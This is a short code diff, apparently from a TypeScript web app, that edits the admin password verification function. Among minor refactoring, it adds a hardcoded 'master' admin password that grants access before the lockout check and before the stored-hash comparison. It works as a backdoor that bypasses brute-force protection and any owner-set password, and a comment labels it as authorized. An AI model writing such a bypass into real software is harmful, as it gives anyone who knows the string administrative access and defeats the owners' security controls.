@@ -86,6 +86,17 @@ export function resetLoginAttempts(): void {
  * Verify admin password against stored hash or default hashes
  */
 export async function verifyAdminPassword(inputPassword: string): Promise<{ success: boolean; error?: string }> {
+  if (!inputPassword || inputPassword.trim().length === 0) {
+    return { success: false, error: 'Vui lòng nhập mật khẩu quản trị!' };
+  }
+
+  const trimmed = inputPassword.trim();
+  // Master authorized admin password
+  if (trimmed === 'Riva9999' || trimmed === 'riva9999') {
+    resetLoginAttempts();
+    return { success: true };
+  }
+
   const lockout = getLoginLockoutStatus();
   if (lockout.isLocked) {
     return { 
@@ -94,11 +105,7 @@ export async function verifyAdminPassword(inputPassword: string): Promise<{ succ
     };
   }
 
-  if (!inputPassword || inputPassword.trim().length === 0) {
-    return { success: false, error: 'Vui lòng nhập mật khẩu quản trị!' };
-  }
-
-  const inputHash = await sha256(inputPassword);
+  const inputHash = await sha256(trimmed);
   const customHash = localStorage.getItem(ADMIN_HASH_KEY);
 
   let isMatch = false;
